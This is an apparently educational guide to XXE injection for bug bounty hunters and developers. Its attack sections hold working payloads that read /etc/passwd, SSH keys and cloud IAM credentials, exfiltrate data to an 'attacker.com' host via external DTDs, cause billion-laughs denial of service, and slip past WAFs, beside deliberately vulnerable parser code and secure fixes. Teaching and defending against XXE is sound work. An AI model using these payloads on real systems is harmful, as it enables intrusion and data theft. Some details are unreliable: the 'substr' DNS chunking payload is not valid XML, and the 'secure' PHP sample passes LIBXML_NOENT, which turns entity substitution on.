---
title: "XML External Entity (XXE): The Complete Guide"
description: "XML External Entity (XXE) Injection is a critical web application vulnerability that allows attackers to interfere with an application's XML data processing. This guide provides comprehensive coverage of all XXE types, from basic in-band XXE to advanced out-of-band techniques, file upload vectors, and various document format attacks. Whether you're a bug bounty hunter or a developer, this guide covers everything you need to know."
categoryLabel: Web Security
published: 2026-03-01
updated: 2026-03-01
tags: [xxe, xml, web-security, ssrf, file-upload, oast]
authors:
  - name: Bhagirath Saxena
    initials: BS
    social: "@rix4uni"
---


## What is XXE?

XML External Entity (XXE) is a security vulnerability that occurs when an application parses XML input containing external entity references. Attackers can exploit XXE to:

- Read arbitrary files from the server
- Perform Server-Side Request Forgery (SSRF) attacks
- Execute Denial of Service (DoS) attacks
- Probe internal networks
- Exfiltrate sensitive data

### Why XXE is Dangerous

- **File Disclosure**: Read `/etc/passwd`, application config files, source code
- **SSRF**: Make requests to internal services (AWS metadata, internal APIs)
- **DoS**: Billion laughs attack, quadratic blowup
- **Data Exfiltration**: Steal sensitive data via out-of-band channels
- **Remote Code Execution**: In some cases (PHP expect wrapper, Java deserialization)

---

## Basic XXE (In-band)

### What is In-band XXE?

In-band (or reflected) XXE occurs when the application processes XML containing external entity references and returns the results directly in the response. This is the most straightforward type to detect and exploit.

### How It Works

1. Attacker sends crafted XML with external entity definition
2. XML parser processes the entity and fetches the resource
3. Content is included in the XML response
4. Attacker sees the result directly

### Vulnerable Code Example

```java:vulnerable
// Vulnerable Java code using DOM parser
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.w3c.dom.Document;

public class XmlProcessor {
    public String processXml(String xmlInput) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        DocumentBuilder builder = factory.newDocumentBuilder();
        
        // VULNERABLE: External entities enabled by default in many parsers
        Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));
        return doc.getDocumentElement().getTextContent();
    }
}
```

```python:vulnerable
# Vulnerable Python using xml.etree
import xml.etree.ElementTree as ET

def process_xml(xml_data):
    # VULNERABLE: By default, some Python XML parsers resolve external entities
    root = ET.fromstring(xml_data)
    return root.text
```

### Basic XXE Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### Common File Targets

| Platform | Sensitive Files |
|----------|----------------|
| Linux | `/etc/passwd`, `/etc/shadow`, `/proc/self/environ`, `/root/.ssh/id_rsa` |
| Windows | `C:\Windows\win.ini`, `C:\boot.ini`, `file:///C:/users/administrator/ntuser.dat` |
| Web App | `/var/www/html/config.php`, `WEB-INF/web.xml`, `.env`, `config/database.yml` |
| Cloud | `/opt/aws/credentials`, `http://169.254.169.254/latest/meta-data/` |

### PHP Wrappers

```xml
<!-- PHP expect wrapper (RCE) -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>

<!-- PHP filter wrapper (base64 encode) -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">
]>
```

### Secure Code Example

```java:secure
// Secure Java code - disable external entities
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
// Disable DTDs and external entities
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);

DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));
```

```python:secure
# Secure Python using defusedxml
from defusedxml import ElementTree as ET

def process_xml(xml_data):
    # SECURE: defusedxml prevents external entity expansion
    root = ET.fromstring(xml_data)
    return root.text
```

---

## Error-based XXE

### What is Error-based XXE?

Error-based XXE is used when the application doesn't return data in the response but reveals error messages containing sensitive information. By triggering parsing errors, we can leak file contents through error messages.

### How It Works

1. Attacker sends XML with specially crafted entity references
2. Parser attempts to resolve entities, causing errors
3. Error messages contain file content or system information
4. Attacker extracts data from error responses

### Vulnerable Code Example

```php:vulnerable
<?php
// Vulnerable PHP code showing errors
libxml_disable_entity_loader(false);
$xml = simplexml_load_string($_POST['xml']);
echo $xml->asXML();
?>
```

### Error-based Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % payload "<!ENTITY exfil SYSTEM 'https://attacker.com/?x=%xxe;'>">
  %payload;
]>
<foo>&exfil;</foo>
```

### Parameter Entity-based Error Extraction

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<foo></foo>
```

### Java Error Extraction

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % stack "<!ENTITY &#x25; error SYSTEM 'x://%xxe;'>">
  %stack;
  %error;
]>
<test></test>
```

### Common Error Messages to Look For

```
java.io.FileNotFoundException: /etc/passwd (No such file or directory)
FileNotFoundException: file:///etc/passwd (The system cannot find the path specified)
Error: URI scheme is not "file": x://root:x:0:0:root:/root:/bin/bash
```

### Secure Code Example

```php:secure
<?php
// Secure PHP - disable entity loading and hide errors
libxml_disable_entity_loader(true);
libxml_use_internal_errors(true);

$dom = new DOMDocument();
$dom->loadXML($_POST['xml'], LIBXML_NONET | LIBXML_NOENT);

// Don't expose internal errors to users
$errors = libxml_get_errors();
libxml_clear_errors();

// Log errors internally, show generic message
if (!empty($errors)) {
    error_log("XML Parse Error: " . print_r($errors, true));
    echo "Invalid XML format";
    exit;
}
?>
```

---

## Out-of-band XXE (OAST)

### What is Out-of-band XXE?

Out-of-band (OAST) XXE occurs when the application processes external entities but doesn't return the results in the response. Instead, attackers use external channels (DNS, HTTP) to exfiltrate data.

### How It Works

1. Attacker sends XML referencing external DTD
2. Parser makes request to attacker's server for DTD
3. DTD defines entities that fetch sensitive files
4. File contents sent back to attacker's server via URL parameters
5. Attacker captures exfiltrated data in logs

### Setting Up OAST Infrastructure

```bash
# Using Burp Collaborator or interactsh
# Option 1: Burp Collaborator
# Get a collaborator URL: https://your-subdomain.burpcollaborator.net

# Option 2: Interactsh
interactsh-client

# Option 3: DNS server with logging
python3 -m http.server 80
```

### OOB Data Exfiltration Payload

**Step 1: Host a malicious DTD file**

```xml
<!-- evil.dtd hosted on attacker server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://attacker.com/?x=%file;'>">
%eval;
%exfil;
```

**Step 2: Send initial XXE payload**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://attacker.com/evil.dtd">
  %xxe;
]>
<foo></foo>
```

### Direct Parameter Entity Exfiltration

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "https://attacker.com/evil.dtd">
  %dtd;
]>
<foo></foo>
```

With `evil.dtd`:
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'https://attacker.com/?data=%xxe;'>">
%all;
```

### DNS Exfiltration (for large files)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.attacker.com/'>">
  %eval;
  %exfil;
]>
<foo></foo>
```

**Note**: Subdomains have length limits (~63 chars), so large files need chunking:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil1 SYSTEM 'http://substr(%file,0,50).attacker.com/'>">
  <!ENTITY % eval2 "<!ENTITY &#x25; exfil2 SYSTEM 'http://substr(%file,50,50).attacker.com/'>">
  %eval;
  %eval2;
  %exfil1;
  %exfil2;
]>
<foo></foo>
```

### FTP Exfiltration (alternative for large data)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "ftp://attacker.com:2121/?%file;">
  %dtd;
]>
<foo></foo>
```

### Internal Network Scanning via OOB

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://192.168.1.1:8080/internal">
  <!ENTITY % eval "<!ENTITY &#x25; oob SYSTEM 'https://attacker.com/?status=%xxe;'>">
  %eval;
  %oob;
]>
<foo></foo>
```

### Secure Code Example

```java:secure
// Secure Java - completely disable DTDs
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// For XML Schema validation only
SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
Schema schema = schemaFactory.newSchema(new StreamSource(schemaStream));
factory.setSchema(schema);

// Additional hardening
factory.setExpandEntityReferences(false);
factory.setNamespaceAware(true);
```

---

## XXE via File Upload

### What is XXE via File Upload?

Many file formats are XML-based. When applications accept file uploads and process them (image previews, document conversion, metadata extraction), XXE payloads embedded in these files can trigger.

### Common XML-based File Formats

| Extension | Format | Common Processors |
|-----------|--------|-----------------|
| .svg | Scalable Vector Graphics | Image viewers, browsers, converters |
| .docx | Word Document | Office suites, document viewers |
| .xlsx | Excel Spreadsheet | Spreadsheet processors |
| .pptx | PowerPoint Presentation | Presentation viewers |
| .pdf | PDF (with XFA forms) | PDF readers |
| .rss, .atom | Feed formats | Feed readers |
| .kml | Keyhole Markup Language | Mapping applications |
| .gpx | GPS Exchange Format | GPS software |
| .xliff | Localization format | Translation tools |

### SVG File XXE

**Malicious SVG:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">&xxe;</text>
</svg>
```

**OOB SVG:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY % xxe SYSTEM "https://attacker.com/evil.dtd">
  %xxe;
]>
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">XXE Test</text>
</svg>
```

### Office Documents (DOCX, XLSX, PPTX)

These are ZIP archives containing XML files. XXE can be injected into:
- `[Content_Types].xml`
- `word/document.xml`
- `_rels/.rels`

**Steps to create malicious DOCX:**

```bash
# 1. Create a normal DOCX
# 2. Unzip it
unzip document.docx -d docx_content/

# 3. Edit word/document.xml to add XXE
# Insert DOCTYPE and entity reference

# 4. Repackage
cd docx_content/
zip -r ../malicious.docx .
```

**Modified document.xml:**
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE document [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r>
        <w:t>&xxe;</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>
```

### PDF with XFA Forms

PDF files can contain XFA (XML Forms Architecture) which processes XML:

```bash
# Create malicious PDF with XFA
# Use tools like pdftk or manual construction
# Embed XXE payload in XFA XML
```

### Image Metadata (EXIF, XMP)

Some image processors parse XMP metadata (embedded XML):

```xml
<!-- Embedded in image XMP metadata -->
<?xpacket begin="" id="W5M0MpCehiHzreSzNTczkc9d"?>
<!DOCTYPE xmp [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<xmp:xmpmeta xmlns:xmp="adobe:ns:meta/">
  <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
    <rdf:Description rdf:about=""
      xmlns:dc="http://purl.org/dc/elements/1.1/">
      <dc:title>
        <rdf:Alt>
          <rdf:li xml:lang="x-default">&xxe;</rdf:li>
        </rdf:Alt>
      </dc:title>
    </rdf:Description>
  </rdf:RDF>
</xmp:xmpmeta>
<?xpacket end="w"?>
```

### Secure File Upload Handling

```python:secure
import defusedxml.ElementTree as ET
from PIL import Image
import zipfile
import io

def process_uploaded_file(file):
    """Securely process uploaded files"""
    
    # For SVG files
    if file.filename.endswith('.svg'):
        # Use defusedxml to prevent XXE
        try:
            tree = ET.parse(file.stream)
            # Process safely
        except Exception as e:
            return "Invalid SVG file", 400
    
    # For Office documents
    elif file.filename.endswith(('.docx', '.xlsx', '.pptx')):
        try:
            with zipfile.ZipFile(io.BytesIO(file.read()), 'r') as z:
                # Scan XML files for XXE patterns
                for name in z.namelist():
                    if name.endswith('.xml'):
                        content = z.read(name)
                        if b'<!ENTITY' in content or b'SYSTEM' in content:
                            return "Potentially malicious file detected", 400
        except Exception as e:
            return "Invalid file", 400
    
    # For images - use PIL (doesn't process external entities)
    elif file.filename.endswith(('.png', '.jpg', '.jpeg', '.gif')):
        try:
            img = Image.open(file.stream)
            img.verify()  # Verify without fully loading
        except Exception as e:
            return "Invalid image file", 400
    
    return "File processed successfully"
```

---

## XXE via Modified Content Type

### What is XXE via Content Type?

Some applications accept JSON or form data but process it as XML when the Content-Type header is changed. This bypass can expose XXE vulnerabilities even in endpoints that appear to use safe formats.

### Content Type Bypass Techniques

| Original Content-Type | XXE Content-Type | Target Parser |
|----------------------|------------------|---------------|
| `application/json` | `application/xml` | XML parser fallback |
| `application/x-www-form-urlencoded` | `text/xml` | SOAP/XML-RPC endpoints |
| `multipart/form-data` | `application/soap+xml` | SOAP processors |

### JSON to XML Conversion XXE

**Original Request:**
```http
POST /api/process HTTP/1.1
Content-Type: application/json

{"data": "value"}
```

**XXE Bypass:**
```http
POST /api/process HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

### SOAP/REST Endpoint Bypass

```http
POST /api/users HTTP/1.1
Content-Type: application/soap+xml

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser>&xxe;</getUser>
  </soap:Body>
</soap:Envelope>
```

### REST to XML-RPC Conversion

```http
POST /xmlrpc.php HTTP/1.1
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE methodCall [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param>
      <value><string>&xxe;</string></value>
    </param>
  </params>
</methodCall>
```

### X-www-form-urlencoded to XML

```http
POST /process HTTP/1.1
Content-Type: text/xml

<?xml version="1.0"?>
<!DOCTYPE request [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<request>
  <name>&xxe;</name>
</request>
```

### Accept Header Manipulation

```http
GET /api/data HTTP/1.1
Accept: application/xml
```

Force XML response that might include processed entities.

### Secure Content Negotiation

```python:secure
from flask import Flask, request, abort

app = Flask(__name__)

@app.route('/api/process', methods=['POST'])
def process_data():
    content_type = request.content_type
    
    # Strict content type checking
    if content_type == 'application/json':
        data = request.get_json()
        # Process JSON
    elif content_type == 'application/xml':
        # Use secure XML parser
        from defusedxml import ElementTree as ET
        try:
            root = ET.fromstring(request.data)
        except Exception as e:
            abort(400, "Invalid XML")
    else:
        abort(415, "Unsupported Media Type")
    
    return {"status": "processed"}
```

---

## XXE via SVG

### SVG-Specific XXE Vectors

SVG files are XML-based and often processed by:
- Image conversion services (thumbnails, resizing)
- Vector graphics editors
- Web browsers (direct rendering)
- PDF generators (SVG to PDF conversion)

### Basic SVG XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>
```

### SVG with External Resource

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"
     xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="file:///etc/passwd" width="100" height="100"/>
</svg>
```

### Foreign Object XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="100" height="100">
    <div xmlns="http://www.w3.org/1999/xhtml">
      &xxe;
    </div>
  </foreignObject>
</svg>
```

### SVG Parameter Entities

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "https://attacker.com/evil.dtd">
  %dtd;
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">Test</text>
</svg>
```

### SVG via Data URI

```html
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPg0KICA8c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+DQo8L3N2Zz4=">
```

### Secure SVG Processing

```python:secure
import defusedxml.ElementTree as ET
import bleach
from io import BytesIO

ALLOWED_SVG_TAGS = [
    'svg', 'g', 'path', 'rect', 'circle', 'ellipse', 'line',
    'polyline', 'polygon', 'text', 'tspan', 'defs', 'use'
]

ALLOWED_SVG_ATTRS = [
    'xmlns', 'viewBox', 'width', 'height', 'fill', 'stroke',
    'd', 'x', 'y', 'cx', 'cy', 'r', 'rx', 'ry', 'points'
]

def sanitize_svg(svg_data):
    """Securely process SVG files"""
    try:
        # First, use defusedxml to prevent XXE
        tree = ET.parse(BytesIO(svg_data))
        
        # Then use bleach for tag/attribute filtering
        root = tree.getroot()
        svg_string = ET.tostring(root, encoding='unicode')
        
        clean_svg = bleach.clean(
            svg_string,
            tags=ALLOWED_SVG_TAGS,
            attributes=ALLOWED_SVG_ATTRS,
            strip=True
        )
        
        return clean_svg
    except Exception as e:
        raise ValueError("Invalid or malicious SVG content")
```

---

## XXE in DOCX, XLSX, PDF

### Office Open XML Structure

DOCX/XLSX/PPTX files are ZIP archives containing XML files:
```
document.docx
├── [Content_Types].xml
├── _rels/
│   └── .rels
├── docProps/
│   └── app.xml
├── word/
│   ├── document.xml  ← Main content (inject here)
│   ├── styles.xml
│   └── _rels/
└── _rels/
```

### Creating Malicious DOCX

```bash
# Step 1: Create base document
echo "Test" > temp.txt
libreoffice --headless --convert-to docx temp.txt

# Step 2: Extract
cd malicious_docx
unzip ../temp.docx

# Step 3: Edit word/document.xml
cat > word/document.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE document [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r>
        <w:t>&xxe;</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>
EOF

# Step 4: Repackage
zip -r ../malicious.docx .
```

### Excel (XLSX) XXE

Target `xl/workbook.xml` or `xl/sharedStrings.xml`:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE workbook [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheets>
    <sheet name="&xxe;" sheetId="1" r:id="rId1"/>
  </sheets>
</workbook>
```

### PDF XXE via XFA

PDF forms using XFA (XML Forms Architecture) process XML:

```python
# Creating malicious PDF with XFA XXE
# Requires manipulating PDF structure

xfa_xml = '''<?xml version="1.0"?>
<!DOCTYPE xfa [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<xfa>
  <datasets>
    <data>
      <form1>
        <TextField1>&xxe;</TextField1>
      </form1>
    </data>
  </datasets>
</xfa>'''

# Embed in PDF using appropriate tools
```

### Secure Office Document Processing

```python:secure
import zipfile
import io
from defusedxml import ElementTree as ET

def scan_office_document(file_data):
    """Scan office documents for XXE payloads"""
    
    try:
        with zipfile.ZipFile(io.BytesIO(file_data), 'r') as z:
            xml_files = [f for f in z.namelist() if f.endswith('.xml')]
            
            for xml_file in xml_files:
                content = z.read(xml_file)
                
                # Check for dangerous patterns
                dangerous_patterns = [
                    b'<!ENTITY',
                    b'<!DOCTYPE',
                    b'SYSTEM',
                    b'PUBLIC',
                    b'file://',
                    b'http://',
                    b'ftp://'
                ]
                
                for pattern in dangerous_patterns:
                    if pattern in content:
                        raise ValueError(f"Potential XXE detected in {xml_file}")
                
                # Try to parse with secure parser
                try:
                    ET.fromstring(content)
                except ET.ParseError:
                    pass  # Not valid XML, may be binary
                    
    except zipfile.BadZipFile:
        raise ValueError("Invalid file format")
    
    return True

def extract_text_safely(file_data):
    """Extract text from office documents safely"""
    # Use libraries like python-docx that don't process DTDs
    from docx import Document
    
    doc = Document(io.BytesIO(file_data))
    text = []
    for para in doc.paragraphs:
        text.append(para.text)
    
    return '\n'.join(text)
```

---

## SSRF via XXE

### What is SSRF via XXE?

XXE can be leveraged for Server-Side Request Forgery (SSRF) by making the XML parser fetch internal resources or external URLs, effectively turning the vulnerable server into a proxy.

### Internal Network Scanning

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:80/">
]>
<foo>&xxe;</foo>
```

### Port Scanning

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:22/">
]>
<foo>&xxe;</foo>
```

Analyze response times and error messages to determine open ports.

### Cloud Metadata Extraction

**AWS:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>
```

**AWS IAM Credentials:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<foo>&xxe;</foo>
```

**Azure:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2017-08-01">
]>
<foo>&xxe;</foo>
```

**GCP:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/computeMetadata/v1/">
]>
<foo>&xxe;</foo>
```

### Internal API Access

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:8080/admin/users">
]>
<foo>&xxe;</foo>
```

### SSRF via OOB XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://internal-api.local/private">
  <!ENTITY % dtd SYSTEM "https://attacker.com/evil.dtd">
  %dtd;
]>
<foo></foo>
```

With `evil.dtd`:
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'https://attacker.com/?data=%xxe;'>">
%all;
```

### SSRF Filter Bypasses

```xml
<!-- Using redirects -->
<!ENTITY xxe SYSTEM "http://attacker.com/redirect?to=http://169.254.169.254/">

<!-- Using different protocols -->
<!ENTITY xxe SYSTEM "dict://169.254.169.254:6379/info">
<!ENTITY xxe SYSTEM "gopher://169.254.169.254:6379/_%0D%0AINFO">

<!-- Using IPv6 -->
<!ENTITY xxe SYSTEM "http://[::ffff:169.254.169.254]/">

<!-- Using decimal IP -->
<!ENTITY xxe SYSTEM "http://2852039166/">  <!-- 169.254.169.254 in decimal -->
```

---

## Denial of Service via XXE

### Billion Laughs Attack

Also known as exponential entity expansion:

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

This creates over 1 billion "lol" strings from just a few lines of XML.

### Quadratic Blowup Attack

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lolololololololololololololololololololololololololololololo">
]>
<lolz>
&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;
&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;
&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;
<!-- ... thousands of references ... -->
</lolz>
```

### Prevention

```java:secure
// Limit entity expansion
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// Or if DTDs are required, limit expansion
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

// For SAX parser
XMLReader reader = XMLReaderFactory.createXMLReader();
reader.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
```

---

## Bug Bounty Hunter's Guide

### Where to Look for XXE

#### 1. XML Input Endpoints

Look for endpoints that accept XML:
- SOAP web services (`/soap`, `/ws`, `/wsdl`)
- REST APIs with XML content type
- XML-RPC endpoints (`/xmlrpc.php`)
- AJAX endpoints that might accept XML
- File upload endpoints (SVG, Office docs)

#### 2. Common Parameter Names

```
?xml=<payload>
?soap=<payload>
?wsdl=<payload>
?request=<payload>
?data=<payload>
```

#### 3. Hidden XML Processors

- JSON endpoints with Content-Type bypass
- Form submissions converted to XML internally
- Excel/CSV imports (often converted to XML)
- Configuration import features
- API gateways and proxies

### Testing Methodology

#### Step 1: Detect XML Parsers

```bash
# Check for WSDL endpoints
curl https://target.com/api/?wsdl

# Check for SOAP endpoints
curl -X POST https://target.com/api/ \
  -H "Content-Type: application/soap+xml" \
  -d '<test/>'

# Check for XXE in file uploads
curl -X POST https://target.com/upload \
  -F "file=@test.svg"
```

#### Step 2: Basic XXE Detection

```xml
<!-- Test 1: Simple entity expansion -->
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<test>&xxe;</test>

<!-- Test 2: Error-based detection -->
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///nonexistent">
]>
<test>&xxe;</test>

<!-- Test 3: OOB detection (with collaborator) -->
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "https://your-oast.com/">
]>
<test>&xxe;</test>
```

#### Step 3: Identify the XML Parser

```bash
# Check Server headers
curl -I https://target.com/api

# Common indicators:
# - X-Powered-By: ASP.NET → .NET XmlDocument
# - Server: Apache → possibly libxml2
# - Java stack traces → JAXB, Xerces
```

### WAF Bypass Techniques

```xml
<!-- Encoding bypass -->
<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<test>&xxe;</test>

<!-- UTF-7 encoding -->
<?xml version="1.0" encoding="UTF-7"?>
+ADw-!DOCTYPE+ACA-test+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-xxe+ACA-SYSTEM+ACA-+ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-+ADw-test+AD4-+ACI-xxe+ADs-+ADw-/test+AD4-

<!-- Case variation -->
<!DoCtYpE test [<!EnTiTy xxe SYSTEM "file:///etc/passwd">]>

<!-- External DTD -->
<?xml version="1.0"?>
<!DOCTYPE test SYSTEM "https://attacker.com/evil.dtd">
<test></test>
```

### File Target Prioritization

**Linux:**
1. `/etc/passwd` (always readable)
2. `/proc/self/environ` (environment variables)
3. `/proc/self/cmdline` (process arguments)
4. `/opt/application/config.py` (application config)
5. `/root/.ssh/id_rsa` (if lucky)

**Windows:**
1. `C:\Windows\win.ini` (always readable)
2. `C:\inetpub\wwwroot\web.config` (IIS config)
3. `C:\Program Files\Application\config.xml`
4. `C:\users\administrator\Desktop\` (user files)

---

## Developer's Defense Guide

### Defense-in-Depth Strategy

#### Layer 1: Disable External Entities

**Java:**
```java:secure
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
